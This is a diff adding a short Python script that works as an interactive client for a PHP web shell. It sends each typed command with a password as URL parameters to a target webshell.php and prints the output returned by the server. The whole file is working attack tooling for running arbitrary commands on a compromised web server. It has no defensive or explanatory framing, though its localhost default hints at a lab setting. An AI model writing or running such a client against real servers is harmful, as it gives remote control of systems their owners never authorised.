@@ -1,0 +1,32 @@
+#!/bin/python3
+# Webshell connection
+import sys
+import requests
+import readline
+from bs4 import BeautifulSoup
+if len(sys.argv) < 2:
+    print("Usage: webshell <password> <target_url>")
+    sys.exit(1)
+else:
+    password = sys.argv[1]
+if len(sys.argv) < 3:
+    target = "http://localhost:8000/webshell.php"
+else:
+    target = sys.argv[2]
+def custom_input(prompt):
+    readline.set_history_length(1000)
+    try:
+        line = input(prompt)
+        return line
+    except EOFError: 
+        print("^D")
+        sys.exit()
+while True:
+    try:
+        cmd = custom_input("$ ")
+        r = requests.get(target, params={'cmd': cmd, 'password': password})
+        soup = BeautifulSoup(r.text, 'html.parser')
+        print(soup.pre.text)
+    except requests.exceptions.RequestException as e:
+        print(e)
+        sys.exit(1)
